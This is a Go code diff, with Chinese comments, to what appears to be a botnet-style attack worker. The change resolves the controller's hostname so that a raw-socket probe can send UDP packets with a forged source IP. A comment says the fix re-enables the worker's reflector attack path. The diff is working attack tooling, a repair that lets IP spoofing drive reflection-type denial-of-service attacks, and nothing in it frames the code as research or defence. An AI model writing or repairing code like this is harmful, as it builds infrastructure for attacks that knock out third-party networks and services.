@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"strconv"
 	"strings"
@@ -96,8 +97,20 @@ func (w *Worker) probeIPSpoofing() (bool, bool) {
 
 	log.Printf("[spoof-probe] registered: claim_ip=%s nonce=%s controller=%s", claimIP, nonce, controllerHost)
 
-	// 2. 注册成功后再发送伪造源 IP 的 UDP 探测包（保证 Controller 已就绪，消除时序竞态）
-	spoof, err := attack.NewSpoofConn(controllerHost, 9091)
+	// 2. 注册成功后再发送伪造源 IP 的 UDP 探测包（保证 Controller 已就绪，消除时序竞态）。
+	// NewSpoofConn 只接受 IP（raw socket），Controller 地址为域名时必须先解析，
+	// 否则探测永远失败且每 60s 重试，反射器攻击路径被永久禁用
+	probeHost := controllerHost
+	if net.ParseIP(probeHost) == nil {
+		resolved, err := net.ResolveIPAddr("ip", probeHost)
+		if err != nil {
+			log.Printf("[spoof-probe] failed to resolve controller host %q: %v", probeHost, err)
+			return false, false
+		}
+		probeHost = resolved.IP.String()
+		log.Printf("[spoof-probe] controller host %q resolved to %s", controllerHost, probeHost)
+	}
+	spoof, err := attack.NewSpoofConn(probeHost, 9091)
 	if err != nil {
 		log.Printf("[spoof-probe] failed to create raw socket: %v", err)
 		return false, false
@@ -106,7 +119,7 @@ func (w *Worker) probeIPSpoofing() (bool, bool) {
 
 	payload := []byte("SPOOF_PROBE:" + nonce)
 	for i := 0; i < 3; i++ {
-		if err := spoof.Send(claimIP, controllerHost, 9091, payload); err != nil {
+		if err := spoof.Send(claimIP, probeHost, 9091, payload); err != nil {
 			log.Printf("[spoof-probe] UDP send failed: %v", err)
 		}
 		time.Sleep(50 * time.Millisecond)
